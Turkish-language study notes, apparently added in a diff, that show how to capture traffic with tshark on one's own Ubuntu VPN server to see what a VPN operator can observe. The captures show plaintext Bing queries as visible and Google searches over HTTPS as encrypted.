+biz vpn i kullanırken bu gibi insanlar bizim ne gibi / hangi datalarımıza erişebiliyorlar bunu öğrenelim 
+
+kali de bir tarafts ovpn dosyamız açık / çalışıyor olsun diğer başka bir terminalde de ssh root@159.65.196.52 çalıştırarak ubuntu serverımıza 
+bağlanalım ardından şifremizi girelim ardından ubuntu serverımızın terminalinde apt-get install tshark çalıştırıyoruz 
+
+tshark da  wireshark gibi ağ trafiğini izleyebileceğimiz bir ptogramdır ancak wireshark dan daha kompakt yani daha basit ve daha az ayrıntıya sahiptir 
+
+yüklendikten sonra tshark çalıştırarak başlatıyoruz ardından kali browserımızdan bing.com a gidiyoruz 
+
+ve ubuntu serverımızdan ctrl+c ile paket alımını durduruyoruz çünkü çok fazla paket alıyor filtreleme yaparak dinlemek daha mantıklı olacaktır 
+bu gibi durumlarda ardından ubuntu serverın çalıştığı terminalin Search tabından Find seçeneğini seçiyoruz ya da direkt kısayol olarak 
+
+shift+ctrl+f basarak açılan penreyenin input kısmına bing yazıp enterlıyoruz gelen çıktılarda bing.com a gidildiğini görebiliyoruz 
+
+yine bing içerisinde yaptığı sorguları da burada aratarak görebiliriz 
+
+şimdi ubuntu terminalimizde tekrar tshark çalıştırıyoruz ve kali browserımızdan google.com a giderek metallica yazıp enterlıyoruz 
+
+daha sonra ctrl+c ile durduruyoruz seach > find yapıyoruz google.com yazıp enterlıyoruz ve bu siteye gittiğimiz ile ilgili verilerin 
+geldiğini görebiliyoruz ardından metallica arattığımızda hiç bir sonuç gelmediğini görüyoruz çünkü google hsts  / https bir site olduğu 
+için aramalarımız clear bir şekilde değil şifrelenmiş bir şekilde ağ trafiğinde görülebilir 
+
+bu trafiği clear bir şekilde ancak ilgili sunucu tarafından okuyabiliriz 
+
